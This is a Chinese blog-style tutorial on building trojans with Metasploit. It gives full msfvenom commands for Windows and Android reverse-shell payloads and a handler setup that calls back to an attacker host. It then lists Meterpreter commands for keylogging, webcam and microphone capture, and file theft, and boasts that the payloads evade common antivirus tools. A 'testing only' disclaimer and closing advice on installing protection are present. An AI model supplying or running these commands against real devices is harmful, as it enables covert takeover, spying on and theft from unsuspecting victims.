相信很多人都有这种感觉,觉得那些会做木马病毒的人非常牛逼,当然会自己完全写出来木马病毒的肯定非常牛逼,但是实际上,大部分人都是在前人的基础上修改,
很多则是用工具生成,出于兴趣,研究了一段时间"黑"科技,也实践了一下!总结了几点简单的工具用法,如果你会用这些工具,你会发现也许一个木马没有你像现在那么难做出来!
本文是本着研究的精神,所有攻击行为都是测试,请勿用于非法用途!

测试环境:kali linux windows7 windows 10 Android等操作系统

主要工具:metasploit framework

关于所用工具,本文不做过多介绍,这里介绍的使用方法也是最基本最简单的用法，其实不仅仅是windows或者Android，还是Mac，Linux，都可能受到这种攻击:

### 1.使用metasploit 工具生存一个木马(windows版本)  ,命令如下:
```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.47 LPORT=8080 -f exe >demo.exe
```
LHOST=后面的ip地址是你自己的局域网ip,目前本人所有的攻击测试仅在局域网试过,也就是内网!

demo.exe为生成的木马文件,把木马文件拷贝到对方电脑上,双击即可运行!据测试,该木马可以过360安全卫士,电脑管家等常用杀毒软件!这还是在没有做任何加密\加壳的情况下.....不过在有些人的电脑上360可以杀出来!可能是版本不同

### 2.打开软件,设置好监听,命令依次如下:
```
use exploit/multi/handler
set payloads windows/meterpreter/reverse_tcp
set LHOST 192.168.1.47
set LPORT 8080
exploit
```

### 3.坐等上钩
此时,只要对方电脑点击运行demo.exe木马文件,这边监听端口就可以收到信息,建立连接!然后可以执行一些入侵指令,对方现在电脑完全在你的掌控之下,常用命令如下:
```
sysinfo     //查看攻击主机的系统信息
kill         //结束进程
ps          //查看进程
reboot      //重启电脑
reg        //修改注册表
shell        //获取shell
shutdown    //关闭电脑
keyscan_start //开启健盘记录功能
keyscan_dump //查看健盘记录信息
keyscan_stop //停止健盘记录
download     //下载文件
upload        //上传文件
uictl enable keyboard　　　//获取键盘鼠标控制权
record_mic　　　　//音频录制
webcam_chat　　　//查看摄像头接口
webcam_list　　　//查看摄像头列表
webcam_stream　 //摄像头视频获取
................
```
### 4.生成Android版本的木马,其实步骤和上面差不多
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.47 LPORT=8080 -r >demo.apk
```
只要你下载安装到你手机上,你手机基本上也是别人的了,获取联系人\通讯录\定位打开摄像头\照片.......而且经测试,小米手机自带的安全中心对此木马完全没用!

不过,据我暂时了解的知识,距离一个完整的木马还有点距离:

1.杀毒软件.据我测试,腾讯的电脑管家就是垃圾,扫描不出来我生成的木马,360基本上一扫就出来,经过简单编码加密后,360会提示风险程序,而系统自带的windows defender更是一点点用都没.不过要想真把木马做成免杀还得花点功夫.......

2.木马持续后门.所谓持续后门就是能让木马开机后自启,经测试,msf自带的2种方法无效.....暂时未找到可行性方法!

3.权限问题.360是个麻烦事,在有些机子上进行操作,比如打开摄像头,360会有提示.....而且木马暂时还没法子终结360的进程,所以蛋疼!

在日常生活中,专门去攻击某些个人的情况很少,很多时候黑客都是采用自动化工具遍地撒网,利用一些公开的漏洞进行攻击!普通人能做的只是让自己别中这些自动化黑客工具的招就行了,如果某些个人或者组织想黑你,真的很简单.............
而且为了安全，最好装一个安全防护软件，甭管是360还是诺顿，亦或者是卡巴斯基，为啥？为的就是防止受到这些生成的木马攻击，这些木马虽然技术含量不高，
但是如果你裸奔，那还真是送，除非你保证你从不在网上下载各种破解软件或者补丁！